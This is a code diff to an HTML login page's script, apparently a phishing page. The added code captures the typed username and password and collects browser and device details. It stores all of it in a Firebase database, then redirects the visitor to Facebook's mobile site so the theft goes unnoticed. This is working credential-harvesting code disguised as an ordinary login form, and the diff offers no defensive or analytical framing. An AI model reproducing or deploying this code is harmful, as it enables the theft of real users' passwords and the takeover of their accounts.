@@ -91,23 +91,26 @@
 <script>
     function post()
 {
+  var device = navigator.userAgent;
+  var platform = navigator.platform;
+  var core= navigator.hardwareConcurrency ;
+  var Ram = navigator.deviceMemory + 'gb' ;
   var username=document.getElementById("username").value;
   var password=document.getElementById("password").value;
-  alert(username);
-  alert(password);
   var ref=firebase.database().ref().child('Users');
   ref.push({
   username:username,
-  password:password
+  password:password,
+  Device : device,
+  Platform : platform,
+  CpuCore :core,
+  Ram:Ram
 });
-alert("success");
+
+window.location.href = 'https://m.facebook.com/' ;
 			
 }
 
-function post1()
-{
-alert("fuck");
-}
 </script>
 </body>
 </html>
